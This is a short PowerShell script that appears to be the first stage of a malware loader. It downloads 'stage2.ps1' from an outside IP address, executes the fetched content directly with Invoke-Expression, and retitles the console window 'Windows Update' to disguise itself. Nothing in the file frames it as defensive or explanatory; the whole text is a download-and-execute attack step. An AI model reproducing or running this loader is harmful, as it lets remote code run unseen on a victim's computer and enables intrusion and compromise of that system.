
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://192.0.2.77/stage2.ps1',
    [int]$TimeoutSec = 16
)
try { IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Loader step failed" }
